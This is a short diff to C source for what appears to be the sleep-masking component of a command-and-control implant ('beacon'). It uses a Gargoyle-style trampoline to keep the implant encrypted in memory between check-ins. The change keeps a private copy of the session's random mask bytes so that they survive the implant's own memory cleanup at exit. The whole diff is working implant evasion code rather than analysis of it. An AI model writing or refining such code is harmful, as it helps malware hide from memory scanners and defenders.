@@ -8,6 +8,8 @@
 
 void   * gtrampoline = NULL;
 GARGLEP * gparms = NULL;
+static char g_mask_copy[MASK_SIZE];  /* outlives gparms (see gargle_mask_bytes) */
+static int  g_mask_ready;
 
 /* Synthesize the mask table from OUR OWN in-memory PE layout instead of
  * consuming the layout-blind table the generator publishes (it is computed
@@ -196,6 +198,23 @@ void gargle_setup_parms(void * begin, void * end, int mask_fn_in_beacon) {
 		gargle_own_sections(gparms, NULL, NULL);
 
 	crypto_rng_get_bytes((unsigned char *)gparms->mask, sizeof(gparms->mask));
+	memcpy(g_mask_copy, gparms->mask, MASK_SIZE);
+	g_mask_ready = 1;
+}
+
+/* The session's mask bytes, served from a private copy: gparms is
+ * tracked memory, and the exit call arrives after track_memory_cleanup()
+ * released it. Before the first sleep there is no session mask yet. */
+void gargle_mask_bytes(char * out, int len) {
+	int k;
+
+	if (!g_mask_ready) {
+		for (k = 0; k < len; k++)
+			out[k] = (char)bigger_rand();
+		return;
+	}
+	for (k = 0; k < len && k < MASK_SIZE; k++)
+		out[k] = g_mask_copy[k];
 }
 
 void gargle_trampoline(void * end, void * begin) {
